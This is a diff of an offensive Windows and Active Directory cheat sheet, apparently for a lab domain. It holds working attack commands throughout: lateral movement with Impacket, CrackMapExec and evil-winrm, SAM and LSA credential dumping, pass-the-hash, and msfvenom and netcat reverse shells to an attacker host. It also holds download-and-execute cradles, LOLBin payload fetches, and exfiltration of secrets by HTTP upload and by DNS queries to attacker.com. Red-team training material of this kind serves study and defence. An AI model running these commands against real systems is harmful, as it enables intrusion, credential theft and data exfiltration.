@@ -74,55 +74,66 @@ Execute commands on remote systems using SMB and the Windows Service Control Man
 
 ### Methods
 
+#### 🌐 REMOTE (From Kali/Attack Machine)
+
 **Impacket psexec.py**
 ```bash
 # Execute command
-psexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 cmd.exe
+psexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11 cmd.exe
 
 # Execute with hash (Pass-the-Hash)
-psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 AKATSUKI/itachi@192.168.56.11
+psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 AKATSUKI/itachi@10.10.12.11
 
 # Execute specific command
-psexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami /all"
+psexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11 "whoami /all"
 ```
 
 **Impacket smbexec.py (stealthier)**
 ```bash
 # Uses a temporary service, less artifacts
-smbexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11
+smbexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11
 
 # Semi-interactive shell
-smbexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
+smbexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.11
 ```
 
 **Impacket atexec.py (Task Scheduler)**
 ```bash
 # Uses Task Scheduler instead of services
-atexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
-```
-
-**Sysinternals PsExec**
-```powershell
-# From Windows
-PsExec.exe \\192.168.56.11 -u AKATSUKI\itachi -p Akatsuki123! cmd.exe
-
-# Run as SYSTEM
-PsExec.exe \\192.168.56.11 -u AKATSUKI\itachi -p Akatsuki123! -s cmd.exe
-
-# Copy program and execute
-PsExec.exe \\192.168.56.11 -u AKATSUKI\itachi -p Akatsuki123! -c evil.exe
+atexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11 "whoami"
 ```
 
 **CrackMapExec**
 ```bash
 # Execute command via various methods
-crackmapexec smb 192.168.56.11 -u itachi -p 'Akatsuki123!' -x "whoami"
+crackmapexec smb 10.10.12.11 -u itachi -p 'Akatsuki123!' -x "whoami"
 
 # PowerShell command
-crackmapexec smb 192.168.56.11 -u itachi -p 'Akatsuki123!' -X "Get-Process"
+crackmapexec smb 10.10.12.11 -u itachi -p 'Akatsuki123!' -X "Get-Process"
 
 # Execute on multiple hosts
-crackmapexec smb 192.168.56.0/24 -u itachi -p 'Akatsuki123!' -x "whoami"
+crackmapexec smb 10.10.12.0/24 -u itachi -p 'Akatsuki123!' -x "whoami"
+```
+
+#### 💻 LOCAL (From Windows Machine)
+
+**Sysinternals PsExec**
+```powershell
+# From Windows
+PsExec.exe \\10.10.12.11 -u AKATSUKI\itachi -p Akatsuki123! cmd.exe
+
+# Run as SYSTEM
+PsExec.exe \\10.10.12.11 -u AKATSUKI\itachi -p Akatsuki123! -s cmd.exe
+
+# Copy program and execute
+PsExec.exe \\10.10.12.11 -u AKATSUKI\itachi -p Akatsuki123! -c evil.exe
+```
+
+**Native PowerShell (sc.exe)**
+```powershell
+# Create and start remote service
+sc \\10.10.12.11 create myservice binPath= "C:\temp\payload.exe"
+sc \\10.10.12.11 start myservice
 ```
 
 ### Blue Team Detection
@@ -147,42 +158,49 @@ Execute commands remotely via WMI protocol.
 
 ### Methods
 
+#### 🌐 REMOTE (From Kali/Attack Machine)
+
 **Impacket wmiexec.py**
 ```bash
 # Semi-interactive shell via WMI
-wmiexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11
+wmiexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11
 
 # Pass-the-Hash
-wmiexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
+wmiexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.11
 
 # Execute single command
-wmiexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
+wmiexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11 "whoami"
 ```
 
-**PowerShell (from Windows)**
+**CrackMapExec WMI**
+```bash
+crackmapexec wmi 10.10.12.11 -u itachi -p 'Akatsuki123!' -x "whoami"
+
+# With hash
+crackmapexec wmi 10.10.12.11 -u itachi -H NTHASH -x "whoami"
+```
+
+#### 💻 LOCAL (From Windows Machine)
+
+**PowerShell WMI**
 ```powershell
 # Create credential object
 $cred = New-Object System.Management.Automation.PSCredential("AKATSUKI\itachi", (ConvertTo-SecureString "Akatsuki123!" -AsPlainText -Force))
 
 # Execute command via WMI
-Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName 192.168.56.11 -Credential $cred
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName 10.10.12.11 -Credential $cred
 
 # Using CIM (newer)
-Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="notepad.exe"} -ComputerName 192.168.56.11 -Credential $cred
+Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="notepad.exe"} -ComputerName 10.10.12.11 -Credential $cred
 ```
 
 **wmic.exe (built-in)**
 ```cmd
 # Execute process on remote system
-wmic /node:192.168.56.11 /user:AKATSUKI\itachi /password:Akatsuki123! process call create "cmd.exe /c whoami > C:\output.txt"
+wmic /node:10.10.12.11 /user:AKATSUKI\itachi /password:Akatsuki123! process call create "cmd.exe /c whoami > C:\output.txt"
 
 # Query processes
-wmic /node:192.168.56.11 /user:AKATSUKI\itachi /password:Akatsuki123! process list brief
-```
-
-**CrackMapExec WMI**
-```bash
-crackmapexec wmi 192.168.56.11 -u itachi -p 'Akatsuki123!' -x "whoami"
+wmic /node:10.10.12.11 /user:AKATSUKI\itachi /password:Akatsuki123! process list brief
 ```
 
 ### Blue Team Detection
@@ -206,52 +224,59 @@ PowerShell remoting over HTTP/HTTPS (5985/5986).
 
 ### Methods
 
+#### 🌐 REMOTE (From Kali/Attack Machine)
+
 **Evil-WinRM (Kali)**
 ```bash
 # Basic connection
-evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!'
+evil-winrm -i 10.10.12.11 -u itachi -p 'Akatsuki123!'
 
 # Pass-the-Hash
-evil-winrm -i 192.168.56.11 -u itachi -H NTHASH
+evil-winrm -i 10.10.12.11 -u itachi -H NTHASH
 
 # With SSL
-evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!' -S
+evil-winrm -i 10.10.12.11 -u itachi -p 'Akatsuki123!' -S
 
 # Upload/Download files
 *Evil-WinRM* PS> upload /path/to/local/file C:\path\on\target
 *Evil-WinRM* PS> download C:\path\on\target /path/to/local/file
 
 # Load PowerShell scripts
-evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!' -s /path/to/scripts/
+evil-winrm -i 10.10.12.11 -u itachi -p 'Akatsuki123!' -s /path/to/scripts/
 *Evil-WinRM* PS> Invoke-Mimikatz.ps1
 ```
 
-**PowerShell (from Windows)**
+**CrackMapExec WinRM**
+```bash
+crackmapexec winrm 10.10.12.11 -u itachi -p 'Akatsuki123!' -x "whoami"
+crackmapexec winrm 10.10.12.11 -u itachi -p 'Akatsuki123!' -X "Get-Process"
+
+# With hash
+crackmapexec winrm 10.10.12.11 -u itachi -H NTHASH -x "whoami"
+```
+
+#### 💻 LOCAL (From Windows Machine)
+
+**PowerShell Remoting**
 ```powershell
 # Enable WinRM on attacker machine
 Enable-PSRemoting -Force
 
 # Create session
 $cred = Get-Credential  # or use PSCredential object
-$session = New-PSSession -ComputerName 192.168.56.11 -Credential $cred
+$session = New-PSSession -ComputerName 10.10.12.11 -Credential $cred
 
 # Enter interactive session
-Enter-PSSession -ComputerName 192.168.56.11 -Credential $cred
+Enter-PSSession -ComputerName 10.10.12.11 -Credential $cred
 
 # Execute command remotely
-Invoke-Command -ComputerName 192.168.56.11 -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName 10.10.12.11 -Credential $cred -ScriptBlock { whoami }
 
 # Execute on multiple hosts
-Invoke-Command -ComputerName 192.168.56.11,192.168.56.12 -Credential $cred -ScriptBlock { hostname }
+Invoke-Command -ComputerName 10.10.12.11,10.10.12.12 -Credential $cred -ScriptBlock { hostname }
 
 # Copy files via session
 Copy-Item -Path C:\local\file.txt -Destination C:\remote\file.txt -ToSession $session
-```
-
-**CrackMapExec WinRM**
-```bash
-crackmapexec winrm 192.168.56.11 -u itachi -p 'Akatsuki123!' -x "whoami"
-crackmapexec winrm 192.168.56.11 -u itachi -p 'Akatsuki123!' -X "Get-Process"
 ```
 
 ### Blue Team Detection
@@ -279,29 +304,29 @@ Full GUI access to remote system.
 **From Linux**
 ```bash
 # xfreerdp
-xfreerdp /v:192.168.56.11 /u:AKATSUKI\\itachi /p:'Akatsuki123!' /cert:ignore
+xfreerdp /v:10.10.12.11 /u:AKATSUKI\\itachi /p:'Akatsuki123!' /cert:ignore
 
 # With drive sharing (file transfer)
-xfreerdp /v:192.168.56.11 /u:AKATSUKI\\itachi /p:'Akatsuki123!' /drive:share,/tmp/
+xfreerdp /v:10.10.12.11 /u:AKATSUKI\\itachi /p:'Akatsuki123!' /drive:share,/tmp/
 
 # Restricted Admin mode (Pass-the-Hash)
-xfreerdp /v:192.168.56.11 /u:itachi /pth:NTHASH /cert:ignore
+xfreerdp /v:10.10.12.11 /u:itachi /pth:NTHASH /cert:ignore
 
 # rdesktop
-rdesktop -u itachi -p 'Akatsuki123!' -d AKATSUKI 192.168.56.11
+rdesktop -u itachi -p 'Akatsuki123!' -d AKATSUKI 10.10.12.11
 ```
 
 **From Windows**
 ```cmd
 # Standard RDP
-mstsc /v:192.168.56.11
+mstsc /v:10.10.12.11
 
 # Cmdkey for credential storage
-cmdkey /add:192.168.56.11 /user:AKATSUKI\itachi /pass:Akatsuki123!
-mstsc /v:192.168.56.11
+cmdkey /add:10.10.12.11 /user:AKATSUKI\itachi /pass:Akatsuki123!
+mstsc /v:10.10.12.11
 
 # SharpRDP (command execution via RDP without GUI)
-SharpRDP.exe computername=192.168.56.11 command="whoami" username=AKATSUKI\itachi password=Akatsuki123!
+SharpRDP.exe computername=10.10.12.11 command="whoami" username=AKATSUKI\itachi password=Akatsuki123!
 ```
 
 **Enable RDP Remotely**
@@ -310,10 +335,10 @@ SharpRDP.exe computername=192.168.56.11 command="whoami" username=AKATSUKI\itach
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
 
 # Enable via WMI
-wmic /node:192.168.56.11 /user:AKATSUKI\itachi /password:Akatsuki123! rdtoggle where AllowTSConnections=0 call SetAllowTSConnections 1
+wmic /node:10.10.12.11 /user:AKATSUKI\itachi /password:Akatsuki123! rdtoggle where AllowTSConnections=0 call SetAllowTSConnections 1
 
 # Enable via PowerShell
-Invoke-Command -ComputerName 192.168.56.11 -Credential $cred -ScriptBlock {
+Invoke-Command -ComputerName 10.10.12.11 -Credential $cred -ScriptBlock {
     Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
     Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 }
@@ -352,28 +377,28 @@ Execute commands via DCOM objects like MMC20.Application, ShellWindows, etc.
 **Impacket dcomexec.py**
 ```bash
 # Using MMC20.Application
-dcomexec.py -object MMC20 AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
+dcomexec.py -object MMC20 AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11 "whoami"
 
 # Using ShellWindows
-dcomexec.py -object ShellWindows AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
+dcomexec.py -object ShellWindows AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11 "whoami"
 
 # Using ShellBrowserWindow
-dcomexec.py -object ShellBrowserWindow AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11 "whoami"
+dcomexec.py -object ShellBrowserWindow AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11 "whoami"
 ```
 
 **PowerShell DCOM**
 ```powershell
 # MMC20.Application
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.56.11"))
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.12.11"))
 $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\output.txt","7")
 
 # ShellWindows
-$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","192.168.56.11"))
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.12.11"))
 $item = $com.Item()
 $item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\output.txt","C:\Windows\System32",$null,0)
 
 # Excel.Application
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","192.168.56.11"))
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","10.10.12.11"))
 $com.DDEInitiate("cmd","/c whoami > C:\output.txt")
 ```
 
@@ -394,19 +419,19 @@ Use SSH for lateral movement if OpenSSH is installed.
 ### Methods
 ```bash
 # Basic SSH
-ssh itachi@192.168.56.11
+ssh itachi@10.10.12.11
 
 # With password
-sshpass -p 'Akatsuki123!' ssh itachi@192.168.56.11
+sshpass -p 'Akatsuki123!' ssh itachi@10.10.12.11
 
 # Execute command
-ssh itachi@192.168.56.11 "whoami"
+ssh itachi@10.10.12.11 "whoami"
 
 # Port forwarding
-ssh -L 8080:10.0.0.5:80 itachi@192.168.56.11
+ssh -L 8080:10.0.0.5:80 itachi@10.10.12.11
 
 # Dynamic SOCKS proxy
-ssh -D 1080 itachi@192.168.56.11
+ssh -D 1080 itachi@10.10.12.11
 ```
 
 ---
@@ -421,13 +446,13 @@ Create scheduled tasks on remote systems for execution.
 **schtasks.exe**
 ```cmd
 # Create remote task
-schtasks /create /s 192.168.56.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask" /tr "cmd.exe /c whoami > C:\output.txt" /sc once /st 00:00 /ru SYSTEM
+schtasks /create /s 10.10.12.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask" /tr "cmd.exe /c whoami > C:\output.txt" /sc once /st 00:00 /ru SYSTEM
 
 # Run the task
-schtasks /run /s 192.168.56.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask"
+schtasks /run /s 10.10.12.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask"
 
 # Delete the task
-schtasks /delete /s 192.168.56.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask" /f
+schtasks /delete /s 10.10.12.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTask" /f
 ```
 
 **PowerShell**
@@ -435,7 +460,7 @@ schtasks /delete /s 192.168.56.11 /u AKATSUKI\itachi /p Akatsuki123! /tn "EvilTa
 $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\output.txt"
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
-Register-ScheduledTask -TaskName "EvilTask" -Action $action -Trigger $trigger -Principal $principal -CimSession (New-CimSession -ComputerName 192.168.56.11 -Credential $cred)
+Register-ScheduledTask -TaskName "EvilTask" -Action $action -Trigger $trigger -Principal $principal -CimSession (New-CimSession -ComputerName 10.10.12.11 -Credential $cred)
 ```
 
 ### Blue Team Detection
@@ -458,18 +483,18 @@ Create or modify services on remote systems.
 **sc.exe**
 ```cmd
 # Create service
-sc \\192.168.56.11 create EvilSvc binPath= "cmd.exe /c whoami > C:\output.txt" start= demand
+sc \\10.10.12.11 create EvilSvc binPath= "cmd.exe /c whoami > C:\output.txt" start= demand
 
 # Start service
-sc \\192.168.56.11 start EvilSvc
+sc \\10.10.12.11 start EvilSvc
 
 # Delete service
-sc \\192.168.56.11 delete EvilSvc
+sc \\10.10.12.11 delete EvilSvc
 ```
 
 **PowerShell**
 ```powershell
-Invoke-Command -ComputerName 192.168.56.11 -Credential $cred -ScriptBlock {
+Invoke-Command -ComputerName 10.10.12.11 -Credential $cred -ScriptBlock {
     New-Service -Name "EvilSvc" -BinaryPathName "cmd.exe /c whoami > C:\output.txt"
     Start-Service -Name "EvilSvc"
 }
@@ -490,33 +515,33 @@ Invoke-Command -ComputerName 192.168.56.11 -Credential $cred -ScriptBlock {
 
 ```bash
 # From Kali - Copy to target
-smbclient //192.168.56.11/C$ -U 'AKATSUKI\itachi%Akatsuki123!' -c "put payload.exe Windows\Temp\payload.exe"
+smbclient //10.10.12.11/C$ -U 'AKATSUKI\itachi%Akatsuki123!' -c "put payload.exe Windows\Temp\payload.exe"
 
 # From Kali - Copy from target
-smbclient //192.168.56.11/C$ -U 'AKATSUKI\itachi%Akatsuki123!' -c "get Windows\Temp\secrets.txt"
+smbclient //10.10.12.11/C$ -U 'AKATSUKI\itachi%Akatsuki123!' -c "get Windows\Temp\secrets.txt"
 
 # Mount share
-mount -t cifs //192.168.56.11/C$ /mnt/share -o username=itachi,password='Akatsuki123!',domain=AKATSUKI
+mount -t cifs //10.10.12.11/C$ /mnt/share -o username=itachi,password='Akatsuki123!',domain=AKATSUKI
 
 # Impacket smbclient
-smbclient.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11
+smbclient.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11
 ```
 
 ```powershell
 # From Windows - Copy to target
-copy C:\payload.exe \\192.168.56.11\C$\Windows\Temp\payload.exe
+copy C:\payload.exe \\10.10.12.11\C$\Windows\Temp\payload.exe
 
 # From Windows - Copy from target
-copy \\192.168.56.11\C$\Windows\Temp\secrets.txt C:\
+copy \\10.10.12.11\C$\Windows\Temp\secrets.txt C:\
 
 # Using credentials
-net use \\192.168.56.11\C$ /user:AKATSUKI\itachi Akatsuki123!
-copy C:\payload.exe \\192.168.56.11\C$\Windows\Temp\
-net use \\192.168.56.11\C$ /delete
+net use \\10.10.12.11\C$ /user:AKATSUKI\itachi Akatsuki123!
+copy C:\payload.exe \\10.10.12.11\C$\Windows\Temp\
+net use \\10.10.12.11\C$ /delete
 
 # PowerShell with credentials
 $cred = Get-Credential
-New-PSDrive -Name "X" -PSProvider FileSystem -Root "\\192.168.56.11\C$" -Credential $cred
+New-PSDrive -Name "X" -PSProvider FileSystem -Root "\\10.10.12.11\C$" -Credential $cred
 Copy-Item C:\payload.exe X:\Windows\Temp\
 Remove-PSDrive X
 ```
@@ -539,35 +564,35 @@ php -S 0.0.0.0:8080
 **On Target - Download**
 ```powershell
 # PowerShell - Invoke-WebRequest
-Invoke-WebRequest -Uri http://192.168.56.100:8080/payload.exe -OutFile C:\Windows\Temp\payload.exe
-iwr http://192.168.56.100:8080/payload.exe -OutFile C:\Windows\Temp\payload.exe
+Invoke-WebRequest -Uri http://10.10.12.100:8080/payload.exe -OutFile C:\Windows\Temp\payload.exe
+iwr http://10.10.12.100:8080/payload.exe -OutFile C:\Windows\Temp\payload.exe
 
 # PowerShell - WebClient
-(New-Object Net.WebClient).DownloadFile('http://192.168.56.100:8080/payload.exe','C:\Windows\Temp\payload.exe')
+(New-Object Net.WebClient).DownloadFile('http://10.10.12.100:8080/payload.exe','C:\Windows\Temp\payload.exe')
 
 # PowerShell - Download and execute in memory
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.100:8080/script.ps1')
-IEX (iwr http://192.168.56.100:8080/script.ps1 -UseBasicParsing).Content
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.12.100:8080/script.ps1')
+IEX (iwr http://10.10.12.100:8080/script.ps1 -UseBasicParsing).Content
 
 # certutil
-certutil -urlcache -split -f http://192.168.56.100:8080/payload.exe C:\Windows\Temp\payload.exe
+certutil -urlcache -split -f http://10.10.12.100:8080/payload.exe C:\Windows\Temp\payload.exe
 
 # bitsadmin
-bitsadmin /transfer job /download /priority high http://192.168.56.100:8080/payload.exe C:\Windows\Temp\payload.exe
+bitsadmin /transfer job /download /priority high http://10.10.12.100:8080/payload.exe C:\Windows\Temp\payload.exe
 
 # curl (Windows 10+)
-curl http://192.168.56.100:8080/payload.exe -o C:\Windows\Temp\payload.exe
+curl http://10.10.12.100:8080/payload.exe -o C:\Windows\Temp\payload.exe
 
 # wget (if available)
-wget http://192.168.56.100:8080/payload.exe -O C:\Windows\Temp\payload.exe
+wget http://10.10.12.100:8080/payload.exe -O C:\Windows\Temp\payload.exe
 ```
 
 ```cmd
 # cmd - certutil
-certutil -urlcache -split -f http://192.168.56.100:8080/payload.exe payload.exe
+certutil -urlcache -split -f http://10.10.12.100:8080/payload.exe payload.exe
 
 # cmd - bitsadmin
-bitsadmin /transfer n http://192.168.56.100:8080/payload.exe C:\Windows\Temp\payload.exe
+bitsadmin /transfer n http://10.10.12.100:8080/payload.exe C:\Windows\Temp\payload.exe
 ```
 
 ## 3. HTTP Upload (Exfiltration)
@@ -595,14 +620,14 @@ EOF
 **From Target**
 ```powershell
 # PowerShell upload
-Invoke-WebRequest -Uri http://192.168.56.100:8080/upload -Method POST -InFile C:\secrets.txt
+Invoke-WebRequest -Uri http://10.10.12.100:8080/upload -Method POST -InFile C:\secrets.txt
 
 # WebClient
 $wc = New-Object System.Net.WebClient
-$wc.UploadFile("http://192.168.56.100:8080/upload", "C:\secrets.txt")
+$wc.UploadFile("http://10.10.12.100:8080/upload", "C:\secrets.txt")
 
 # Invoke-RestMethod
-Invoke-RestMethod -Uri http://192.168.56.100:8080/upload -Method POST -InFile C:\secrets.txt
+Invoke-RestMethod -Uri http://10.10.12.100:8080/upload -Method POST -InFile C:\secrets.txt
 ```
 
 ## 4. FTP Transfers
@@ -617,7 +642,7 @@ python3 -m pyftpdlib -p 21 -w  # Anonymous write access
 **From Target**
 ```cmd
 # Create FTP script
-echo open 192.168.56.100 > ftp.txt
+echo open 10.10.12.100 > ftp.txt
 echo anonymous >> ftp.txt
 echo anonymous >> ftp.txt
 echo binary >> ftp.txt
@@ -628,7 +653,7 @@ ftp -s:ftp.txt
 
 ```powershell
 # PowerShell FTP
-$ftp = [System.Net.FtpWebRequest]::Create("ftp://192.168.56.100/payload.exe")
+$ftp = [System.Net.FtpWebRequest]::Create("ftp://10.10.12.100/payload.exe")
 $ftp.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile
 $response = $ftp.GetResponse()
 $reader = $response.GetResponseStream()
@@ -661,13 +686,13 @@ certutil -decode encoded.txt payload.exe
 
 ```powershell
 # Download
-Start-BitsTransfer -Source "http://192.168.56.100:8080/payload.exe" -Destination "C:\Windows\Temp\payload.exe"
+Start-BitsTransfer -Source "http://10.10.12.100:8080/payload.exe" -Destination "C:\Windows\Temp\payload.exe"
 
 # Upload
-Start-BitsTransfer -Source "C:\secrets.txt" -Destination "http://192.168.56.100:8080/upload" -TransferType Upload
+Start-BitsTransfer -Source "C:\secrets.txt" -Destination "http://10.10.12.100:8080/upload" -TransferType Upload
 
 # Asynchronous (stealthy)
-$job = Start-BitsTransfer -Source "http://192.168.56.100:8080/payload.exe" -Destination "C:\Windows\Temp\payload.exe" -Asynchronous
+$job = Start-BitsTransfer -Source "http://10.10.12.100:8080/payload.exe" -Destination "C:\Windows\Temp\payload.exe" -Asynchronous
 while (($job.JobState -eq "Transferring") -or ($job.JobState -eq "Connecting")) { Sleep 1 }
 Complete-BitsTransfer -BitsJob $job
 ```
@@ -689,7 +714,7 @@ for /f "tokens=*" %a in (secrets.txt) do nslookup %a.attacker.com
 
 ```powershell
 # Create session
-$session = New-PSSession -ComputerName 192.168.56.11 -Credential $cred
+$session = New-PSSession -ComputerName 10.10.12.11 -Credential $cred
 
 # Copy to remote
 Copy-Item -Path C:\payload.exe -Destination C:\Windows\Temp\ -ToSession $session
@@ -942,7 +967,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 # If enabled, create MSI payload
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f msi > evil.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.12.100 LPORT=4444 -f msi > evil.msi
 
 # Install MSI (will run as SYSTEM)
 msiexec /quiet /qn /i evil.msi
@@ -1007,7 +1032,7 @@ copy C:\Windows\Temp\payload.exe "C:\task\binary.exe"
 # 6. PATH directories
 
 # Create malicious DLL
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f dll > evil.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.12.100 LPORT=4444 -f dll > evil.dll
 
 # Place in search path before legitimate DLL
 ```
@@ -1021,7 +1046,7 @@ whoami /priv
 # If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:
 
 # JuicyPotato (Windows Server 2019 and earlier)
-JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe 192.168.56.100 4444 -e cmd.exe" -t *
+JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe 10.10.12.100 4444 -e cmd.exe" -t *
 
 # PrintSpoofer (Windows 10/Server 2019)
 PrintSpoofer.exe -i -c cmd.exe
@@ -1033,7 +1058,7 @@ GodPotato.exe -cmd "cmd /c whoami"
 SweetPotato.exe -a "cmd /c whoami"
 
 # RoguePotato
-RoguePotato.exe -r 192.168.56.100 -e "cmd /c whoami" -l 9999
+RoguePotato.exe -r 10.10.12.100 -e "cmd /c whoami" -l 9999
 ```
 
 ## 8. Kernel Exploits
@@ -1171,7 +1196,7 @@ reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
 
 # CrackMapExec
-crackmapexec smb 192.168.56.11 -u itachi -p 'Akatsuki123!' --sam
+crackmapexec smb 10.10.12.11 -u itachi -p 'Akatsuki123!' --sam
 ```
 
 ## 3. LSA Secrets
@@ -1181,7 +1206,7 @@ crackmapexec smb 192.168.56.11 -u itachi -p 'Akatsuki123!' --sam
 lsadump::secrets
 
 # Impacket
-secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11
 
 # Contains:
 # - Service account passwords
@@ -1337,12 +1362,12 @@ runas /netonly /user:AKATSUKI\itachi cmd.exe
 
 ```bash
 # Impacket - various tools
-psexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
-wmiexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
-smbexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
+psexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.11
+wmiexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.11
+smbexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.11
 
 # CrackMapExec
-crackmapexec smb 192.168.56.11 -u itachi -H NTHASH
+crackmapexec smb 10.10.12.11 -u itachi -H NTHASH
 
 # Mimikatz
 sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:cmd.exe
@@ -1387,25 +1412,25 @@ msbuild.exe evil.csproj
 
 # MSHTA
 mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd"", 0:close")
-mshta.exe http://192.168.56.100/evil.hta
+mshta.exe http://10.10.12.100/evil.hta
 
 # Rundll32
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd")
 
 # Regsvr32
-regsvr32 /s /n /u /i:http://192.168.56.100/evil.sct scrobj.dll
+regsvr32 /s /n /u /i:http://10.10.12.100/evil.sct scrobj.dll
 
 # WMIC
 wmic process call create "cmd.exe /c whoami"
-wmic os get /format:"http://192.168.56.100/evil.xsl"
+wmic os get /format:"http://10.10.12.100/evil.xsl"
 
 # Certutil
-certutil -urlcache -split -f http://192.168.56.100/payload.exe C:\Windows\Temp\payload.exe
+certutil -urlcache -split -f http://10.10.12.100/payload.exe C:\Windows\Temp\payload.exe
 certutil -encode payload.exe payload.b64
 certutil -decode payload.b64 payload.exe
 
 # Bitsadmin
-bitsadmin /transfer job /download /priority high http://192.168.56.100/payload.exe C:\Windows\Temp\payload.exe
+bitsadmin /transfer job /download /priority high http://10.10.12.100/payload.exe C:\Windows\Temp\payload.exe
 
 # InstallUtil
 InstallUtil.exe /logfile= /LogToConsole=false /U evil.dll
@@ -1431,23 +1456,23 @@ SyncAppvPublishingServer.exe "n; Start-Process cmd"
 
 ```powershell
 # Certutil
-certutil -urlcache -split -f http://192.168.56.100/file.exe file.exe
+certutil -urlcache -split -f http://10.10.12.100/file.exe file.exe
 
 # Bitsadmin
-bitsadmin /transfer job http://192.168.56.100/file.exe C:\file.exe
+bitsadmin /transfer job http://10.10.12.100/file.exe C:\file.exe
 
 # PowerShell
-powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.56.100/file.exe','C:\file.exe')"
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.100/script.ps1')"
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.12.100/file.exe','C:\file.exe')"
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.12.100/script.ps1')"
 
 # curl (Win10+)
